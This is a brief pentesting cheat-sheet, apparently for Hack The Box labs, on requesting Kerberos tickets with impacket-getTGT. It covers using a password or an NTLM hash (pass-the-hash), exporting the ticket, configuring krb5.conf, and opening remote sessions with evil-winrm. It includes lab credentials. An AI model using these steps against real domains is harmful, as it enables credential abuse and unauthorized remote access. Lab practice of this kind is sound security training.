# impacket-getTGT

The getTGT tool specifically is used to request a Ticket Granting Ticket (TGT) from a Kerberos Key Distribution Center (KDC) within a Windows domain.

## Usage

```
impacket-getTGT <domain>/<username>:<password>
getTGT.py <domain>/<username>
```

Geeting a ticket using credential:

```shell
faketime "$(ntpdate -q rustykey.htb | awk '{print $1" "$2}')" impacket-getTGT rustykey.htb/'rr.parker':'8#t5HE8L!W3A'
```

Getting a ticket with NTLM hash:

```shell
impacket-getTGT  -hashes :<ntlm_hash> <domain>/'<username>'
impacket-getTGT  -hashes :aad3b435b51404eeaad3b435b51404ee vintage.htb/'GMSA01$'
```

### Use a TGT to connect with evil-winrm or ssh

Make sure the clock is sync with kerberos:
```
https://github.com/AndreMIsidoro/escalations/blob/f6dc2013309973181232d7ec1a6f7a9c6f41d070/ad_enumeration.md#sync-time-with-kerberos
```

Then get the ticket and export it:

export KRB5CCNAME=<path_to_ticket>

Finally edit /etc/krb5.conf with the domain name and the dc name. Example:

```
REMOVE THE COMMENTS
[libdefaults]
    default_realm = RUSTYKEY.HTB # change this
    dns_lookup_realm = false
    dns_lookup_kdc = false
    ticket_lifetime = 24h
    renew_lifetime = 7d
    forwardable = true

[realms]
    RUSTYKEY.HTB = { # change this
        kdc = 10.129.232.127 # change this
        admin_server = dc01.RUSTYKEY.HTB
        default_domain = RUSTYKEY.HTB
    }

[domain_realm]
    .MIRAGE.HTB = RUSTYKEY.HTB #change this
    MIRAGE.HTB = RUSTYKEY.HTB #change this
```

Connect by doing:

```shell
ssh <username>@<server>
evil-winrm -i <server_ip> -r <domain_name>
#example
evil-winrm -i frizzdc.frizz.htb -r frizz.htb
```
